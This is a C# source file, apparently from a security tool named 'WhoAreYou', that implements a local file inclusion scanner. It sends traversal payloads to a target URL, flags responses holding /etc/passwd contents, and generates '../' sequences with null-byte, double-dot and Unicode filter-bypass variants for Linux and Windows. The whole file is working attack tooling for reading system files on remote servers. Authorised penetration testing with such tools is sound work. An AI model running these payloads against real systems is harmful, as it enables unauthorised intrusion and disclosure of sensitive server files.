using System.Text;
using File = WhoAreYou.Helpers.File;

namespace WhoAreYou.Modules;

internal class Lfi
{
    private static readonly HttpClient Client = new();
    private readonly string _url;

    /// <param name="url">
    ///     The base URL which needs to have an empty parameter like `https://????.com?id=` (note the empty value after `=`).
    /// </param>
    public Lfi(string url)
    {
        if (string.IsNullOrWhiteSpace(url))
            throw new ArgumentException("URL cannot be null or empty.", nameof(url));

        _url = url;
    }

    /// <param name="lfiPayloadsPath">File Path of the LFI Payloads</param>
    public async Task ScanLfi(string lfiPayloadsPath)
    {
        var lfiLinks = File.GenerateFileName("LFI Vulns");
        var lfiPayloads = File.ReadFromFile(lfiPayloadsPath);
        foreach (var payload in lfiPayloads)
        {
            var urlToTest = _url + payload;

            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine($"Testing: {urlToTest}");

            try
            {
                var response = await Client.GetAsync(urlToTest);

                if (response.IsSuccessStatusCode)
                {
                    var content = await response.Content.ReadAsStringAsync();
                    if (content.Contains("root:x:0:0:root"))
                    {
                        File.AppendToFile(lfiLinks, urlToTest);
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"Potential LFI vulnerability found at: {urlToTest}");
                        Console.ReadKey();
                    }
                }
                else
                {
                    Console.WriteLine($"Failed to access {urlToTest} (Status Code: {response.StatusCode})");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error occurred while testing {urlToTest}: {ex.Message}");
            }
        }
    }

    /// <param name="useNullByteBypass">Whether to use null byte bypass in the payloads.</param>
    /// <param name="useCurrentDirBypass">Whether to use current directory bypass in the payloads.</param>
    /// <param name="useDoubleDotBypass">Whether to use double dot bypass in the payloads.</param>
    /// <param name="maxDepth">The maximum depth for directory traversal.</param>
    /// <param name="desiredPath">The desired path to be used in the payloads.</param>
    /// <param name="platform">The platform to generate payloads for (windows or linux).</param>
    /// <param name="useUnicodeBypass">Whether to use Unicode bypass in the payloads. (only Linux)</param>
    public List<string> GeneratePayloads(bool useNullByteBypass = false,
        bool useCurrentDirBypass = false, bool useDoubleDotBypass = false, int maxDepth = 10,
        string desiredPath = "/etc/passwd", string platform = "linux", bool useUnicodeBypass = false)
    {
        var payloads = new List<string>();

        for (var i = 1; i <= maxDepth; i++)
        {
            var pattern = RepeatPattern(i, useDoubleDotBypass, useUnicodeBypass, platform);
            var prePayload = _url + pattern + desiredPath;

            if (useCurrentDirBypass) prePayload += "/.";
            if (useNullByteBypass) prePayload += "%00";

            payloads.Add(prePayload);
        }

        return payloads;
    }

    private static string RepeatPattern(int depth, bool useDoubleDotBypass, bool useUnicodeBypass, string platform)
    {
        if (useUnicodeBypass && platform.ToLower() == "windows")
            throw new ArgumentException("Unicode bypass is not supported for Windows.",
                nameof(useUnicodeBypass));

        var result = new StringBuilder();
        if (platform.ToLower() == "windows")
            for (var j = 0; j < depth; j++)
                result.Append(useDoubleDotBypass ? "....\\\\" : "..\\\\");
        else if (platform.ToLower() == "linux")
            for (var j = 0; j < depth; j++)
                if (useUnicodeBypass)
                    result.Append("%uff0e%uff0e%u2215");
                else
                    result.Append(useDoubleDotBypass ? "....//" : "../");
        else
            throw new ArgumentException("Invalid platform specified.", nameof(platform));

        return result.ToString();
    }
}